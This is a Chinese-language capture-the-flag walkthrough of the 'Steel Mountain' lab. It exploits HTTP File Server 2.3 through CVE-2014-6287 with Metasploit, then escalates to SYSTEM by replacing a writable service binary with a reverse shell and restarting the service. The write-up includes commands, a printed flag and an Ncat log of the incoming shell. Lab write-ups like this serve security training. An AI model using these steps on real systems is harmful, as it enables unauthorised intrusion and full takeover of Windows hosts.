# Steel Mountain

在此会议室中，您将枚举Windows计算机，使用Metasploit获得初始访问权限，使用Powershell进一步枚举计算机并将权限升级到管理员。


---

循例 nmap 扫

一大堆端口，其中有80、8080、145、139、445、3389....

进入8080的web页面看到是HTTP File Server v2.3

searchsploit搜索相关版本的cve

CVE-2014-6287

进入msfconsole：

    search CVE-2014-6287
    use 0

设置好相关的参数并运行exp，getshell

    type C:\Users\bill\Desktop\user.txt
    b04763b6fcf51fcd7c13abc7db4fd365

---

#### 权限提升：

利用PowUp.ps1收集相关信息

    meterpreter> upload /PowUp.ps1
                 load powershell
                 powershell_shell

    powershell> . .\PowerUp.ps1
                Invoke-AllChecks


CanRestart 选项为 true，允许我们在系统上重新启动服务，应用程序的目录也是可写的。这意味着我们可以用恶意应用程序替换合法应用程序，重新启动服务，这将运行我们受感染的程序！

上传revserse shell到目标:

    meterpreter > upload /home/sugobet/rev_exe.exe

回到cmd:

    copy ./rev_exe.exe "C:\....."
    sc stop serviceName
    sc start serviceName

成功提权

<pre>Ncat: Connection from 10.10.16.205.
Ncat: Connection from 10.10.16.205:49277.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

</pre>


不使用metasploit也可以，道理是一样的，不演示。
